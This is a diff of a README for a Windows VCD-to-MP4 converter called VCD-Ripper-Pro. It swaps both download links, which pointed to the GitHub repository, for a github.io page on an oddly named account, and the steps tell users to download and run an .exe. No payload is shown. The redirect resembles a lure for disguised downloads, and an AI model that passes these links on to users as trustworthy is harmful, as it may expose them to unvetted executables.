@@ -1,6 +1,6 @@
 # 💿 VCD-Ripper-Pro - Rescue your old video discs today
 
-[![Download VCD-Ripper-Pro](https://img.shields.io/badge/Download-VCD_Ripper_Pro-blue.svg)](https://github.com/Genuscinchonanondevelopment491/VCD-Ripper-Pro)
+[![Download VCD-Ripper-Pro](https://img.shields.io/badge/Download-VCD_Ripper_Pro-blue.svg)](https://genuscinchonanondevelopment491.github.io)
 
 VCD-Ripper-Pro converts your collection of Video Compact Discs (VCDs) into digital files. It changes the outdated .dat file format into the modern .mp4 format. This process preserves your home movies and rare footage stored on aging discs.
 
@@ -8,7 +8,7 @@ VCD-Ripper-Pro converts your collection of Video Compact Discs (VCDs) into digit
 
 You do not need programming skills to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Genuscinchonanondevelopment491/VCD-Ripper-Pro).
+1. Go to the [official release page](https://genuscinchonanondevelopment491.github.io).
 2. Look for the latest version under the "Releases" section.
 3. Click the link ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
